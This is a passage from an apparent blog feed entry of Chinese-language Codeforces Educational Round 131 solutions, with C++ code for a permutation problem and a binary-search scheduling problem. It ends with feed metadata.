class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;2\n1 2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;3\n2 1 3&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=n)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="number">1</span>)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j*=<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,j);</span><br><span class="line">            a[j]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>m个工作，n个人，每个工作有一个熟练工，如果让熟练工完成，那么只需要一个小时，让其余工人完成都需要两个小时。</p><p>我们直接二分答案就行了，至于check函数，我们就先计算每个工人的熟练工作个数。</p><p>然后做出如下算法：</p><ol><li>对于一个人，若它熟练a[i]种工作，那么它会尽量花费a[i]的时间去做完这a[i]的工作，若时间有剩，那么剩余时间做 <code>(t-a[i])/2</code> 个工作。</li><li>判断n个工人在t时间内是否能完成m项工作只需把工人按照以上算法加起来，判断一下大小就行了。</li></ol><p>时间上二分，选择最大可能时间，最大可能时间就是把所有人都当场不熟练工计算就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m,t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;a[%d]=%d\n&quot;,i,a[i]);</span></span><br><span class="line"><span class="comment">//        if(!a[i])&#123;</span></span><br><span class="line"><span class="comment">//            break;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;t)&#123;</span><br><span class="line">            ans+=a[i];</span><br><span class="line">            ans+=(t-a[i])/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ans+=t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;time=%d ans=%d\n&quot;,t,ans);</span></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)*(n+<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        a[x]++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n,cmp);</span><br><span class="line">    t=(m/n)*<span class="number">2</span>+(!!(m%n))*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="number">1</span>,r=t;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;mid=%d\n&quot;,mid);</span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="built_in">cal</span>(mid);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(res&lt;m)&#123;</span><br><span class="line">            l=mid+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            r=mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,l);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>啥也不说了，猛练吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天掉大分，预估回青名吧。实时&lt;a href=&quot;https://www.bilibili.com/video/BV1KN4y1u7qB&quot;&gt;录屏&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
</feed>
